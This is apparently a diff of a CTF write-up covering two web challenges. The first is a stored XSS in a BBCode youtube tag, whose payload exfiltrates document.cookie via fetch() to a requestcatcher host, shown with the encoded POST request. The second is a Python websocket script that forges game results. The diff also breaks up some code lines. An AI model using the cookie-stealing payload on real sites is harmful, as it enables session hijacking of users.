@@ -12,43 +12,18 @@ app.get("/image", (req, res) => {
  res.status(403).send('Access Denied');
  }
 });
-```
-
-
-
-```
 "raw": "nothing to see here \ud83d\udc40\ud83d\udc40 [color=]the flag is b3N1e29rX3Vfc2VlX21lfQ== encoded with base64]"
-```
-
-
-
-```
 const renderBio = (data) => {
  const html = renderBBCode(data);
  const sanitized = purify.sanitize(html);
  // do this after sanitization because otherwise iframe will be removed
  return sanitized.replaceAll(
  /\[youtube\](.+?)\[\/youtube\]/g,
- '<iframe sandbox="allow-scripts" width="640px" height="480px" src="https://www.youtube.com/embed/$1" frameborder="0" allowfullscreen></iframe>'
+ ''
  );
 };
-```
-
-
-
-```
 [youtube]" onload="fetch(`https://[yours].requestcatcher.com/get?${document.cookie}`)" dummy="[/youtube]
-```
 
-
-
-```
-<iframe sandbox="allow-scripts" width="640px" height="480px" src="https://www.youtube.com/embed/" onload="fetch(`https://[yours].requestcatcher.com/get?${document.cookie}`)" dummy="" frameborder="0" allowfullscreen></iframe>
-```
-
-
-
-```
 POST /api/update HTTP/1.1
 Host: profile-page.web.osugaming.lol
 Content-Length: 189
@@ -58,11 +33,6 @@ csrf: 1b979825ce8ef2324cf1c56a9548fd2cbadc7f336dfe70dfe91d691a7e206e3b
 Connection: close
 
 bio=%5byoutube%5d%22%20onload%3d%22fetch(%60https%3a%2f%2f[yours].requestcatcher.com%2fget%3f%24%7bdocument.cookie%7d%60)%22%20dummy%3d%22%5b%2fyoutube%5d
-```
-
-
-
-```
 Game ID: qlbc3
  admin
  cookiezi
@@ -76,11 +46,6 @@ Song #3 / 3: xi - Blue Zenith (200 BPM)
  cookiezi - 200.00 BPM | 20.00 UR 🏆
  admin - 0.00 BPM | 0.00 UR
 Better luck next time!
-```
-
-
-
-```
 // scoring algorithm
 // first judge by whoever has round(bpm) closest to target bpm, if there is a tie, judge by lower UR
 /*
@@ -91,17 +56,9 @@ session.results[session.round] = session.results[session.round].sort((a, b) => {
  return a.ur - b.ur
 });
 */
-```
-
-
-
-```
-{"type":"results","data":{"clicks":[],"start":1709344913209,"end":1709344922274}}
-```
-
-
-
-```
+{"type":"results","data":{"clicks":[],"start":
+1709344913209,"end":
+1709344922274}}
 // algorithm from https://ckrisirkc.github.io/osuStreamSpeed.js/newmain.js
 const calculate = (start, end, clicks) => {
  const clickArr = [...clicks];
@@ -116,11 +73,6 @@ const calculate = (start, end, clicks) => {
 
  return { bpm: bpm || 0, ur: stdev * 10 || 0};
 };
-```
-
-
-
-```
 from websocket import create_connection
 import json
 from decimal import *
@@ -129,7 +81,7 @@ ws = create_connection("wss://stream-vs.web.osugaming.lol/")
 
 def send_and_recv(payload):
  ws.send(json.dumps(payload))
- return json.loads(ws.recv()) 
+ return json.loads(ws.recv())
 
 send_and_recv({"type":"login","data":"evilman"})
 send_and_recv({"type":"challenge"})
@@ -142,7 +94,10 @@ for song in songs:
  while clicks[-1] + interval <= end:
  clicks.append(clicks[-1] + interval)
 
- p = {"type":"results","data":{"clicks":clicks,"start":start, "end":end}}
+ p = {"type":"results","data":{"clicks":
+clicks,"start":
+start, "end":
+end}}
  #print(p)
  send_and_recv(p) # results
  print(ws.recv()) # game or message
